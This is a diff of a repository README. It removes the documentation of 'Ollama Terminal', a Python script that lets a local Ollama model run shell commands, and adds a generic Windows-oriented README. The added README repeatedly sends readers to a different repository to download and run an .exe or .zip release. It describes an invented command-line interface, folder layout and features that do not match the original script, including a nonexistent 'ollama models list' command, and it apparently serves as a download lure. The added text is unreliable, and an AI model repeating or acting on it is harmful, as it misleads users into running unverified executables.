@@ -1,244 +1,196 @@
-[<img src="https://ko-fi.com/img/githubbutton_sm.svg">](https://ko-fi.com/lagkitty)
+# 🖥️ Ollama-Terminal-Agent - Local AI Agent for Simple Automation
 
-# 🤖 Ollama Terminal
-
-An autonomous terminal agent powered by a **locally running Ollama model**.
-
-Describe a task, it plans the steps, runs real shell commands, reads the output, fixes errors, and continues until the task is fully complete.
-
-✅ 100% local  
-✅ No API keys  
-✅ No cloud  
-✅ No data leaves your machine  
-
-<sub>If you don’t trust this `.py` file, you can upload it to any AI or review tool and verify that it’s safe.</sub>
+[![Download Ollama-Terminal-Agent](https://img.shields.io/badge/Download-Ollama--Terminal--Agent-brightgreen?style=for-the-badge)](https://github.com/unequalequality/Ollama-Terminal-Agent)
 
 ---
 
-## 🖥 Full Demo
+## 🧩 What is Ollama-Terminal-Agent?
 
-```
-╔══════════════════════════════════════════╗
-║    🤖   O L L A M A   T E R M I N A L   ║
-╚══════════════════════════════════════════╝
+Ollama-Terminal-Agent is a tool that runs on your Windows computer. It uses a local AI model (called a large language model or LLM) to help you perform tasks in the terminal. It can fix mistakes on its own and work with files, all without needing an internet connection.
 
-● Ollama: running   2 model(s)
-
-Main Menu
-──────────────────────────────────────────────────────────
-1. ▶ Run Task              auto-select model
-2. ⚙ Run Task              choose model manually
-3. ⭐ Saved Tasks
-4. ↓ Pull a Model
-5. ✓ System Check
-6. ✏ Custom Instructions
-7. ⟳ Start Ollama
-0. Exit
-──────────────────────────────────────────────────────────
-Choice: 1
-
-Auto-selected: llama3:latest
-
-What do you want me to do?
-> set up a python project called weather-cli with a venv, install requests, and write a hello world script
-
-Connected (chat)
-
-──────────────────────────────────────────────────────────
-Model: llama3:latest
-Task:  set up a python project called weather-cli with a venv, install requests, and write a hello world script
-──────────────────────────────────────────────────────────
-
-Step 1  explore home directory
-┌─ $ ls /home/alex
-│ Desktop  Documents  Downloads  Music  Pictures
-└─ ✓
-
-Step 2  create project folder
-┌─ $ mkdir -p /home/alex/Documents/weather-cli
-└─ ✓
-
-Step 3  create virtual environment
-┌─ $ python3 -m venv /home/alex/Documents/weather-cli/venv
-└─ ✓
-
-Step 4  install requests into venv
-┌─ $ /home/alex/Documents/weather-cli/venv/bin/pip install requests
-│ Successfully installed requests
-└─ ✓
-
-Step 5  write hello world script
-
-❓ Agent asks: Should the script print to stdout or write to a log file?
-   Your answer: stdout is fine
-
-┌─ $ printf 'print("Hello from weather-cli!")\n' > /home/alex/Documents/weather-cli/main.py
-└─ ✓
-
-Step 6  verify script runs correctly
-┌─ $ /home/alex/Documents/weather-cli/venv/bin/python main.py
-│ Hello from weather-cli!
-└─ ✓
-
-══════════════════════════════════════════════════════════
-✓  Task complete!
-
-Created weather-cli project with venv, installed requests,
-wrote and verified main.py — all in /home/alex/Documents/weather-cli
-══════════════════════════════════════════════════════════
-
-Save as a saved task? [y/N]: y
-✓ Saved!
-```
-
-(Alex is just an example name.)
+You do not need to know programming to use this tool. It automates simple jobs you might do in the command line, like creating files or running commands based on your instructions.
 
 ---
 
-## 🚀 What It Can Do
+## ⚙️ Key Features
 
-- Create projects  
-- Install packages  
-- Manage files  
-- Debug errors  
-- Run system maintenance  
-- Use web search when needed  
-- Break large tasks into safe, small steps  
-
-Everything runs in your real shell.
+- Runs entirely on your computer with Ollama — no data leaves your machine.
+- Works through the terminal (Command Prompt or PowerShell).
+- Can run tasks automatically.
+- Detects and fixes errors during tasks.
+- Handles files for you, such as reading, writing, or modifying content.
+- Supports multiple AI-based commands.
 
 ---
 
-## ✨ Core Features
+## 🖥️ System Requirements
 
-- Autonomous execution loop  
-- Live streaming command output  
-- Self-correcting error handling  
-- Strict JSON action format  
-- Automatically detects:
-  - Username  
-  - Home directory  
-  - Operating system  
-  - Shell  
-  - Current working directory  
-  - Available package managers  
-- Saved tasks  
-- Custom persistent instructions  
-- Auto-starts Ollama if needed  
-- Works with most Ollama models  
+To run Ollama-Terminal-Agent on Windows, you need:
+
+- Windows 10 or newer (64-bit recommended)
+- At least 4 GB of RAM
+- Minimum 2 GHz dual-core processor
+- 500 MB free disk space for the application
+- Installed Ollama software with at least one local LLM model available
+
+If you don’t have Ollama installed, download it from the official Ollama website before continuing.
 
 ---
 
-## 📦 Requirements
+## 🚀 Getting Started — Download and Setup
 
-- Python 3.8+  
-- Ollama installed  
-- `requests` library  
+1. **Visit the Download Page**
 
-Install dependency:
+   Click this link to visit the official GitHub page where you can download the latest release:  
+   [https://github.com/unequalequality/Ollama-Terminal-Agent](https://github.com/unequalequality/Ollama-Terminal-Agent)  
+   This page has all files and instructions for the application.
 
-```bash
-pip install requests
-```
+2. **Download the Application**
 
-Pull at least one model:
+   On the GitHub page, find the "Releases" section in the right sidebar or top menu.  
+   Download the latest Windows release file. It will usually be a `.zip` archive or an `.exe` installer.
 
-```bash
-ollama pull llama3
-```
+3. **Install the Application**
 
----
+   - If you downloaded a `.zip` file:  
+     - Right-click the file and choose "Extract All".  
+     - Extract it to a folder you can find easily, like your Desktop or Documents.
 
-## ▶ Usage
+   - If you downloaded an `.exe` installer:  
+     - Double-click the file to start the installation.  
+     - Follow the prompts on the screen and finish the installation.
 
-Interactive menu:
+4. **Verify Installation**
 
-```bash
-python ollama_terminal.py
-```
-
-Run a task directly:
-
-```bash
-python ollama_terminal.py "find all .log files older than 7 days and delete them"
-```
-
-Choose a model manually:
-
-```bash
-python ollama_terminal.py -m mistral "check for flatpak updates"
-```
-
-System check:
-
-```bash
-python ollama_terminal.py --check
-```
+   Open Command Prompt or PowerShell:  
+   - Press `Windows + R`, type `cmd` or `powershell`, and press Enter.  
+   - Type `ollama-terminal-agent --help` and press Enter.  
+   If installed correctly, you will see a help message listing commands.
 
 ---
 
-## ⚙ Configuration
+## ⚡ How to Use Ollama-Terminal-Agent
 
-Inside `ollama_terminal.py`:
+This tool runs in the Windows terminal. You type commands, and the AI completes tasks.
 
-```python
-OLLAMA_BASE      = "http://localhost:11434"
-MAX_ITERATIONS   = 60
-MAX_JSON_RETRIES = 5
-MAX_HISTORY_MSGS = 16
+### Running Tasks
+
+- Open Command Prompt or PowerShell.
+- Use the command:  
+  `ollama-terminal-agent run "Your instructions here"`  
+  Example:  
+  ```  
+  ollama-terminal-agent run "Create a to-do list for tomorrow."  
+  ```  
+- The agent will process the instruction and complete the task locally.
+
+### Handling Files
+
+You can ask the agent to read or modify files:  
+```
+ollama-terminal-agent run "Read the contents of file.txt and summarize it."  
 ```
 
-You can adjust these if needed.
+### Self-Correction
+
+If a task fails or has errors, the agent tries to fix them automatically. You can rerun commands if needed.
 
 ---
 
-## 🧠 How It Works (Simple)
+## 🛠️ Configuration and Customization
 
-1. You describe a task.  
-2. The model replies in strict JSON:
-   ```json
-   {"action":"run","command":"...","reason":"..."}
-   ```
-3. The script runs the command.  
-4. The output is sent back to the model.  
-5. The loop continues until:
-   ```json
-   {"action":"done","summary":"..."}
-   ```
-
-The model must verify success before finishing.
-
----
-
-## 🧩 Recommended Models
-
-- `llama3` — reliable all-rounder  
-- `llama3.1` — strong reasoning  
-- `mistral` — fast and stable  
-- `qwen2.5-coder` — coding tasks  
-- `deepseek-r1` — thorough reasoning  
-
-⚠ Very small models (<1B parameters) may struggle with strict JSON formatting.
-
----
-
-## 🛡 Security Note
-
-This tool executes **real shell commands**.
-
-Be specific with tasks.  
-Avoid vague destructive instructions such as:
-
+Ollama-Terminal-Agent uses the Ollama local AI models. You can choose different models using the `--model` option:  
 ```
-clean my system
-optimize everything
-delete unused stuff
+ollama-terminal-agent run --model llama2 "Write a summary of this text."
 ```
 
-Always review what you are asking it to do.
+Check the available models on your computer by running:  
+```
+ollama models list
+```
+
+You can also adjust settings in the configuration file located in the installation folder. The config file allows you to set default models, task timeout, and file paths.
 
 ---
 
-## 📄 License
+## 🐞 Troubleshooting
 
-MIT
+### The application does not start
+
+- Make sure Ollama is installed and running on your computer.
+- Check that you have at least one AI model downloaded in Ollama.
+- Confirm you have the right Windows version and sufficient system resources.
+
+### Commands do not work or return errors
+
+- Try running your Command Prompt or PowerShell as Administrator.
+- Ensure the file paths and command syntax are correct.
+- Check the Ollama-Terminal-Agent logs in the `logs` folder inside the installation directory. They may point to the problem.
+
+### The agent cannot fix a mistake
+
+- Re-run the command with clearer instructions.
+- Restart your terminal and try again.
+- Verify your Ollama model is working properly by running a simple command using Ollama directly.
+
+---
+
+## 📥 Download Links
+
+You can visit the GitHub page below to download the application and get the latest updates:  
+
+[Download Ollama-Terminal-Agent](https://github.com/unequalequality/Ollama-Terminal-Agent)
+
+---
+
+## 🔗 Additional Resources
+
+- Ollama Software: Visit the official Ollama site to install and manage AI models.
+- Terminal Basics: If you are new to Command Prompt or PowerShell, look up Windows terminal guides on Microsoft’s website.
+- Community Support: Use GitHub Issues on the repository page to report any bugs or request help.
+
+---
+
+## 📂 Folder Structure Overview
+
+- `bin/` – The main executable file for Windows.
+- `config/` – Configuration files you can edit.
+- `logs/` – Log files created when you run commands.
+- `docs/` – Additional guides and manuals.
+- `examples/` – Sample command scripts.
+
+---
+
+## 🧰 Command Summary
+
+| Command                        | Description                          |
+|-------------------------------|------------------------------------|
+| `ollama-terminal-agent run`   | Run an AI task with instructions   |
+| `ollama-terminal-agent --help`| Show available commands            |
+| `ollama-terminal-agent --model <name>` | Run task using a specific AI model |
+
+---
+
+## 🔒 Privacy and Security
+
+Ollama-Terminal-Agent runs entirely on your computer. Your data never leaves your machine. The AI models process all tasks locally, ensuring your information stays private.
+
+---
+
+## 🕹️ Using the Application Safely
+
+- Do not run commands from unknown sources.
+- Regularly update the tool from the GitHub page.
+- Back up important files before letting the agent modify them.
+
+---
+
+## ⚡ Tips for Best Results
+
+- Use clear, simple instructions for tasks.
+- Start with small tasks before trying complex workflows.
+- Explore different local AI models to find one that suits your needs.
+
+---
+
+[![Download Ollama-Terminal-Agent](https://img.shields.io/badge/Download-Ollama--Terminal--Agent-brightgreen?style=for-the-badge)](https://github.com/unequalequality/Ollama-Terminal-Agent)
